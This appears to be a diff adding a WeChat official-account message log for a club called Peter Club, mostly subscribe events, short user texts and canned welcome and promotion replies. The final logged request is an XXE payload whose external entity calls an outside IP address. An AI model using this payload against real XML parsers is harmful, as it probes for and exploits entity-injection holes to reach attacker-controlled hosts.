@@ -1,0 +1,173 @@
+11:17:34 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></FromUserName>
+<CreateTime>1502421454</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[啊]]></Content>
+<MsgId>6452851010154594078</MsgId>
+</xml>
+11:17:34 T <xml>
+<ToUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1502421454</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[2017-08-11 11:17:34
+欢迎关注Peter Club!
+请使用下面的菜单]]></Content>
+</xml>
+11:18:56 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></FromUserName>
+<CreateTime>1502421536</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[啊]]></Content>
+<MsgId>6452851362341912417</MsgId>
+</xml>
+11:18:56 T <xml>
+<ToUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1502421536</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[2017-08-11 11:18:56
+欢迎关注Peter Club!
+请使用下面的菜单]]></Content>
+</xml>
+11:41:04 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></FromUserName>
+<CreateTime>1502422865</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[unsubscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+11:41:04 T <xml>
+<ToUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1502422864</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[取消关注]]></Content>
+</xml>
+11:41:57 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></FromUserName>
+<CreateTime>1502422917</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[subscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+11:41:57 T <xml>
+<ToUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1502422917</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[欢迎关注Peter Club！]]></Content>
+</xml>
+11:42:16 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></FromUserName>
+<CreateTime>1502422937</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[啊]]></Content>
+<MsgId>6452857379591095356</MsgId>
+</xml>
+11:42:16 T <xml>
+<ToUserName><![CDATA[odfRht_mdekLfTyXRpkvuqWGYK5A]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1502422936</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[会员中心]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/wx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/wx/user_center.php]]></Url>
+    </item>
+</Articles>
+</xml>
+08:52:52 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht6JKfh9nPt2UWC4fC1L3kjY]]></FromUserName>
+<CreateTime>1504399973</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[unsubscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+08:52:52 T <xml>
+<ToUserName><![CDATA[odfRht6JKfh9nPt2UWC4fC1L3kjY]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1504399972</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[取消关注]]></Content>
+</xml>
+14:52:09 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></FromUserName>
+<CreateTime>1505199129</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[subscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+14:52:09 T <xml>
+<ToUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1505199129</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[欢迎关注Peter Club！]]></Content>
+</xml>
+14:53:03 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></FromUserName>
+<CreateTime>1505199184</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[unsubscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+14:53:03 T <xml>
+<ToUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1505199183</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[取消关注]]></Content>
+</xml>
+14:53:15 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></FromUserName>
+<CreateTime>1505199196</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[subscribe]]></Event>
+<EventKey><![CDATA[]]></EventKey>
+</xml>
+14:53:15 T <xml>
+<ToUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1505199195</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[欢迎关注Peter Club！]]></Content>
+</xml>
+14:53:34 R <xml><ToUserName><![CDATA[gh_7318938396cc]]></ToUserName>
+<FromUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></FromUserName>
+<CreateTime>1505199215</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[g]]></Content>
+<MsgId>6464781402807132905</MsgId>
+</xml>
+14:53:34 T <xml>
+<ToUserName><![CDATA[odfRht24AYK4MczjXKdXAwsznSRE]]></ToUserName>
+<FromUserName><![CDATA[gh_7318938396cc]]></FromUserName>
+<CreateTime>1505199214</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[会员中心]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/wx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/wx/user_center.php]]></Url>
+    </item>
+</Articles>
+</xml>
+13:20:41 R <?xml version="1.0" encoding="utf-8"?>
+                            <!DOCTYPE ANY [
+	                            <!ENTITY h SYSTEM "http://119.29.144.42/rec.php?u=3076650101">
+                            ]>
+                            <xml>
+	                            <test>&h;</test>
+                            </xml>
+                            
+13:20:41 T 
